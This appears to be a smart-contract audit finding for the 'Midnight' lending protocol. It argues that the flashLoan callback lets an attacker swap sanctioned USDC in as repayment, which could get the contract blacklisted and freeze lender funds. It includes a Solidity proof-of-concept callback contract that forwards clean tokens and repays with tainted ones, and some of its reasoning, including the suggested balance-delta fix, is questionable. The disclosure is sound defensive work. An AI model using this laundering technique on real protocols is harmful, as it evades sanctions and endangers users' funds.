### Title
Flash Loan Callback Allows Tainted Token Laundering Through Midnight — (`src/Midnight.sol`)

### Summary

Midnight's `flashLoan` function sends clean tokens to an attacker-controlled callback, then blindly pulls repayment back from that same callback address. During the callback window, the callback can forward the clean tokens to a clean address and substitute tainted tokens (e.g., USDC from a sanctioned address) as repayment. Midnight ends up holding tainted tokens with no record of the substitution.

### Finding Description

The root cause is in `flashLoan` at [1](#0-0) :

```solidity
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);   // (1) send clean tokens to callback
}
require(
    IFlashLoanCallback(callback).onFlashLoan(...) == CALLBACK_SUCCESS, // (2) callback executes freely
    ...
);
for (uint256 i = 0; i < tokens.length; i++) {
    SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]); // (3) pull from callback
}
```

Step (3) pulls `assets[i]` of `tokens[i]` from `callback`, but it does not verify that the tokens being pulled are the same tokens that were sent in step (1). During step (2), the callback is free to:

1. Forward the clean tokens received in step (1) to any clean address.
2. Receive tainted tokens (e.g., USDC from a sanctioned wallet) into itself.
3. Approve Midnight to pull those tainted tokens.

Midnight then pulls the tainted tokens in step (3) and stores them in its own balance. There is no access control on `flashLoan` — any caller with any callback can trigger this path. [2](#0-1) 

The `repay` function has an analogous pattern: state is updated first, then `onRepay` is called on the callback, then `safeTransferFrom` pulls from `payer` (which is `callback`). The callback can similarly substitute tainted tokens during `onRepay`. [3](#0-2) 

### Impact Explanation

For tokens with on-chain compliance enforcement (USDC, USDT, etc.), the token issuer can blacklist contract addresses. If Midnight's contract address is blacklisted after receiving tainted tokens:

- All `safeTransfer` and `safeTransferFrom` calls for that token revert.
- Lenders cannot `withdraw` their funds. [4](#0-3) 
- Borrowers cannot `repay`. [3](#0-2) 
- `liquidate` and `claimSettlementFee` also revert for that token. [5](#0-4) 
- All markets using that loan token are permanently frozen.

This constitutes a permanent, irrecoverable loss of user funds for all lenders in affected markets.

### Likelihood Explanation

- **No privileged access required**: `flashLoan` is permissionless — any EOA or contract can call it with any callback. [6](#0-5) 
- **Attacker preconditions**: The attacker needs tainted tokens of the same type held by Midnight (e.g., USDC). This is realistic for any sanctioned entity or mixer output.
- **Token requirement**: Only tokens with blacklisting (USDC, USDT) are affected. Midnight makes no restriction on which tokens can be used as loan tokens. [7](#0-6) 
- **Trigger**: A single transaction is sufficient. No governance or admin action is needed.

### Recommendation

1. **Restrict flash loan repayment source**: Instead of pulling repayment from `callback`, require the caller to pre-approve Midnight and pull directly from `msg.sender`, or record the balance before/after and require the balance to have increased by at least `assets[i]` (balance-delta check), preventing the callback from substituting a different token source.

2. **Balance-delta pattern** (preferred): Record `balanceBefore` for each token before the transfer, and after the callback verify `balance >= balanceBefore`. This ensures the same tokens are returned regardless of who holds them during the callback.

3. **Gate flash loans**: Optionally, add an access gate to `flashLoan` analogous to `enterGate`, allowing markets or the protocol to restrict flash loan access to compliant callers.

### Proof of Concept

```solidity
contract TaintedLauncher is IFlashLoanCallback {
    IMidnight midnight;
    address taintedSource;
    address cleanDest;
    IERC20 usdc;

    constructor(IMidnight _midnight, address _tainted, address _clean, IERC20 _usdc) {
        midnight = _midnight; taintedSource = _tainted; cleanDest = _clean; usdc = _usdc;
    }

    function launch(uint256 amount) external {
        address[] memory tokens = new address[](1);
        uint256[] memory assets = new uint256[](1);
        tokens[0] = address(usdc); assets[0] = amount;
        midnight.flashLoan(tokens, assets, address(this), "");
    }

    function onFlashLoan(address, address[] memory, uint256[] memory assets, bytes memory)
        external returns (bytes32)
    {
        // Step 1: forward clean USDC to clean destination
        usdc.transfer(cleanDest, assets[0]);
        // Step 2: pull tainted USDC from sanctioned source (pre-approved)
        usdc.transferFrom(taintedSource, address(this), assets[0]);
        // Step 3: approve Midnight to pull tainted USDC back
        usdc.approve(address(midnight), assets[0]);
        return keccak256("IFlashLoanCallback.onFlashLoan");
    }
}
```

After `launch(amount)`:
- `cleanDest` holds `amount` of clean USDC.
- Midnight holds `amount` of tainted USDC (from `taintedSource`).
- If Circle blacklists Midnight's address, all USDC markets are permanently frozen. [8](#0-7)

### Citations

**File:** src/Midnight.sol (L133-140)
```text
/// TOKEN SAFETY REQUIREMENTS
/// @dev List of assumptions on tokens that guarantee that Midnight behaves as expected:
/// - It should be ERC-20 compliant, except that it can omit return values on transfer and transferFrom. In particular,
/// it should not revert because a transfer is no-op.
/// - Midnight's balance of the token should only decrease on transfer and transferFrom.
/// - It should not re-enter Midnight on transfer nor transferFrom.
/// - Midnight must send/receive exactly the requested amount on transfers.
/// @dev See LIVENESS for liveness guarantees.
```

**File:** src/Midnight.sol (L481-500)
```text
    function withdraw(Market memory market, uint256 units, address onBehalf, address receiver) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);
        MarketState storage _marketState = marketState[id];
        _updatePosition(market, id, onBehalf);

        Position storage _position = position[id][onBehalf];
        uint128 pendingFeeDecrease;
        if (_position.credit > 0) {
            pendingFeeDecrease = UtilsLib.toUint128(_position.pendingFee.mulDivUp(units, _position.credit));
            _position.pendingFee -= pendingFeeDecrease;
        }
        _position.credit -= UtilsLib.toUint128(units);
        _marketState.withdrawable -= UtilsLib.toUint128(units);
        _marketState.totalUnits -= UtilsLib.toUint128(units);

        emit EventsLib.Withdraw(msg.sender, id, units, onBehalf, receiver, pendingFeeDecrease);

        SafeTransferLib.safeTransfer(market.loanToken, receiver, units);
    }
```

**File:** src/Midnight.sol (L502-521)
```text
    function repay(Market memory market, uint256 units, address onBehalf, address callback, bytes calldata data)
        external
    {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);

        position[id][onBehalf].debt -= UtilsLib.toUint128(units);
        marketState[id].withdrawable += UtilsLib.toUint128(units);

        address payer = callback != address(0) ? callback : msg.sender;
        emit EventsLib.Repay(msg.sender, id, units, onBehalf, payer);

        if (callback != address(0)) {
            require(
                IRepayCallback(callback).onRepay(id, market, units, onBehalf, data) == CALLBACK_SUCCESS,
                WrongRepayCallbackReturnValue()
            );
        }
        SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), units);
    }
```

**File:** src/Midnight.sol (L696-717)
```text
        SafeTransferLib.safeTransfer(market.collateralParams[collateralIndex].token, receiver, seizedAssets);

        if (callback != address(0)) {
            require(
                ILiquidateCallback(callback)
                    .onLiquidate(
                        msg.sender,
                        id,
                        market,
                        collateralIndex,
                        seizedAssets,
                        repaidUnits,
                        borrower,
                        receiver,
                        data,
                        badDebt
                    ) == CALLBACK_SUCCESS,
                WrongLiquidateCallbackReturnValue()
            );
        }

        SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), repaidUnits);
```

**File:** src/Midnight.sol (L737-752)
```text
    function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
        external
    {
        require(tokens.length == assets.length, InconsistentInput());
        emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
        }
        require(
            IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
            WrongFlashLoanCallbackReturnValue()
        );
        for (uint256 i = 0; i < tokens.length; i++) {
            SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
        }
    }
```
